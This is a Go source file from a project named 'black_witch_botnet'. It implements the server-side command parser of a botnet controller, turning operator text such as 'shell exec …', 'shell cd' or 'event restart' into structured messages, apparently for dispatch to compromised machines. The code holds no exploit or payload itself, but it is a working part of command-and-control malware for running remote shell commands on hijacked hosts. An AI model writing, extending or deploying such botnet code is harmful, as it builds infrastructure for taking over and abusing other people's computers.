package server

import (
	"black_witch_botnet/relations"
	"errors"
	"strings"
)

const (
	domainShell = "shell"
	domainEvent = "event"
)

const (
	shellTypeExec      = "exec"
	shellTypeChangeDir = "cd"
)

const (
	eventTypeHello   = "hello"
	eventTypeRestart = "restart"
)

var domains = []string{domainShell, domainEvent}
var shellTypes = []string{shellTypeExec, shellTypeChangeDir}
var eventTypes = []string{eventTypeHello, eventTypeRestart}

type Parser struct {
	Text string
}

func (p *Parser) Parse() (interface{}, error) {
	seq := strings.Split(p.Text, " ")

	i := 0

	if len(seq) == 0 {
		return nil, errors.New("unable to parse command")
	}

	domain, ok := p.Normalize(seq, domains, &i)

	if !ok {
		return nil, errors.New("unable to find domain")
	}

	switch domain {
	case "shell":
		return p.parseShell(seq[i:])
	case "event":
		return p.parseEvent(seq[i:])
	default:
		return nil, errors.New("unknown domain")
	}
}

func (p *Parser) parseShell(seq []string) (*relations.ShellCommand, error) {
	i := 0
	t, ok := p.Normalize(seq, shellTypes, &i)

	if !ok {
		return nil, errors.New("unable to find shell type")
	}

	shell := &relations.ShellCommand{}

	switch t {
	case shellTypeExec:
		shell.Type = relations.ShellTypeExec
	case shellTypeChangeDir:
		shell.Type = relations.ShellTypeChangeDir
	default:
		return nil, errors.New("unknown shell type")
	}

	shell.Data = []byte(strings.Join(seq[i:], " "))

	return shell, nil
}

func (p *Parser) parseEvent(seq []string) (*relations.EventMessage, error) {
	i := 0
	t, ok := p.Normalize(seq, eventTypes, &i)

	if !ok {
		return nil, errors.New("unable to find event type")
	}

	event := &relations.EventMessage{}

	switch t {
	case eventTypeHello:
		event.Type = relations.EventTypeHello
	case eventTypeRestart:
		event.Type = relations.EventTypeRestart
	default:
		return nil, errors.New("unknown event type")
	}

	event.Data = []byte(strings.Join(seq[i:], " "))

	return event, nil
}

func (p *Parser) Normalize(seg []string, enum []string, i *int) (string, bool) {
	var res string

	if len(seg) < *i+1 {
		return "", false
	}

	for _, n := range enum {
		if seg[*i] == n {
			res = seg[*i]
			*i += 1
			break
		}
	}

	if len(res) == 0 {
		res = enum[0]
	}

	return res, true
}
